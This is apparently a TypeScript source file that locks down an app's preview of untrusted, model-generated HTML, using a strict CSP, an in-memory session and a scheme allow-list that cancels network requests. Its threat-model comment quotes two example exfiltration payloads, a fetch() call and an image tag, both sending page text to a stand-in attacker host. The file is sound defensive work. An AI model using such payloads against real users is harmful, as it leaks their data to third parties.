/**
 * @license
 * Copyright 2026 Ferrox Labs
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * P2-8. The policy for previewing UNTRUSTED generated HTML.
 *
 * The preview panel renders a document a model assembled out of third-party
 * data nobody vetted - a market report quoting a scraped page, a competitor
 * digest quoting a competitor - and a recurring task renders it on a schedule
 * with nobody watching. The threat is not IPC: the guest runs `sandbox=yes`,
 * `contextIsolation=yes` and has no preload, so it cannot reach `ipcBridge`.
 * The threat is EGRESS - `fetch('https://attacker/?d='+document.body.innerText)`
 * or a bare `<img src="https://attacker/pixel?d=...">`, which needs no script
 * at all. So both halves have to be shut: scripts AND the network.
 *
 * ## Why the network block is not "just CSP", and the CSP is not "just
 * `javascript=no`"
 *
 * Both of those were measured against real Electron rather than assumed:
 *
 *  - Setting `javascript: false` on the guest ALSO disables the HOST's
 *    `webContents.executeJavaScript`. It throws. The preview's scroll-sync and
 *    inspect-mode are both built on `executeJavaScript`, so turning scripts off
 *    that way silently breaks two shipped features. A `default-src 'none'` CSP
 *    stops the page's own scripts while leaving the host's injection working -
 *    verified: page script did not run, host script returned its value.
 *  - A `data:` document never passes through `webRequest.onHeadersReceived`
 *    (there is no response to attach a header to), so a header-only CSP would
 *    cover the `file://` path and miss the generated-HTML path entirely. A
 *    `file://` document DOES pass through it, and cannot carry an injected
 *    `<meta>` because the bytes are the user's file. Hence both forms: the meta
 *    for documents we assemble, the header for documents we merely point at.
 *  - Subresource requests from BOTH document kinds do reach
 *    `webRequest.onBeforeRequest` - a `https://` image inside a `data:` preview
 *    was intercepted and cancelled, and `fetch()` from it rejected. That is the
 *    layer that actually holds when everything else is bypassed.
 */

/**
 * The preview's own session.
 *
 * Deliberately NOT `persist:`-prefixed: an in-memory partition means a hostile
 * report cannot leave a cookie, a service worker, a cache entry or localStorage
 * behind for the next report to read. It also keeps the block below off every
 * other surface in the app - the ambient window, URL viewers, OAuth webviews -
 * which legitimately need the network.
 */
export const UNTRUSTED_PREVIEW_PARTITION = 'wayland-untrusted-preview';

/**
 * The policy itself.
 *
 * `default-src 'none'` is the whole point: script, connect, frame, object,
 * worker and everything else added to CSP in future default to denied, and the
 * three directives below re-admit only what a local report needs to LOOK right.
 *
 * `base-uri` is deliberately absent. The renderer injects `<base href="file://…">`
 * so relative images in a generated report resolve; `base-uri 'none'` would
 * block our own injection and leave every relative resource broken. A hostile
 * `<base>` buys nothing here, because the only thing it can redirect resolution
 * TO is a remote origin, and remote is dead twice over (this policy admits no
 * remote scheme, and the session cancels the request).
 */
export const UNTRUSTED_PREVIEW_CSP = [
  "default-src 'none'",
  'img-src data: file: blob:',
  "style-src 'unsafe-inline' data: file:",
  'font-src data: file:',
  'media-src data: file: blob:',
  "form-action 'none'",
  "frame-ancestors 'none'",
].join('; ');

/** Schemes a local preview legitimately loads. Everything else is egress. */
const LOCAL_PREVIEW_SCHEMES: ReadonlySet<string> = new Set(['file', 'data', 'blob', 'about']);

/**
 * Should this request from the preview session be cancelled?
 *
 * Fails CLOSED: a target that will not parse, or carries no scheme, is blocked.
 * An allow-list of schemes rather than a deny-list, for the same reason
 * `shellOpenSafety` allow-lists types - the set of ways to reach the network
 * grows without us, and one missed scheme is the exfiltration this exists to
 * prevent.
 */
export function isBlockedPreviewRequestUrl(rawUrl: string): boolean {
  if (typeof rawUrl !== 'string' || rawUrl.length === 0) return true;
  const separator = rawUrl.indexOf(':');
  if (separator <= 0) return true;
  const scheme = rawUrl.slice(0, separator).toLowerCase();
  // A scheme is ALPHA *( ALPHA / DIGIT / "+" / "-" / "." ) per RFC 3986; a
  // "scheme" containing anything else came from a string that is not a URL.
  if (!/^[a-z][a-z0-9+.-]*$/.test(scheme)) return true;
  return !LOCAL_PREVIEW_SCHEMES.has(scheme);
}

/** Matches any `<meta http-equiv="Content-Security-Policy" …>` the document supplied. */
const EXISTING_CSP_META = /<meta\b[^>]*http-equiv\s*=\s*["']?content-security-policy["']?[^>]*>/gi;

const CSP_META_TAG = `<meta http-equiv="Content-Security-Policy" content="${UNTRUSTED_PREVIEW_CSP}">`;

/**
 * Put our policy at the top of the document.
 *
 * A document-supplied CSP meta is REMOVED first. Not because it could loosen
 * ours - multiple policies intersect, so it could not - but because leaving it
 * makes the effective policy a function of attacker-controlled text, and the
 * next person reading the DOM cannot tell which one is enforcing. One policy,
 * ours, is the only auditable state.
 *
 * Injection is at the FRONT of `<head>`: CSP applies from the point it is
 * parsed, so a meta after a `<script>` would let that script run.
 */
export function withPreviewCsp(html: string): string {
  const stripped = (html ?? '').replace(EXISTING_CSP_META, '');

  const headOpen = /<head\b[^>]*>/i.exec(stripped);
  if (headOpen) {
    const at = headOpen.index + headOpen[0].length;
    return `${stripped.slice(0, at)}${CSP_META_TAG}${stripped.slice(at)}`;
  }

  const htmlOpen = /<html\b[^>]*>/i.exec(stripped);
  if (htmlOpen) {
    const at = htmlOpen.index + htmlOpen[0].length;
    return `${stripped.slice(0, at)}<head>${CSP_META_TAG}</head>${stripped.slice(at)}`;
  }

  // A bare fragment. Prepending a head is still parsed as one by the HTML
  // parser's implied-tag handling, so the policy is in force for the rest.
  return `<head>${CSP_META_TAG}</head>${stripped}`;
}
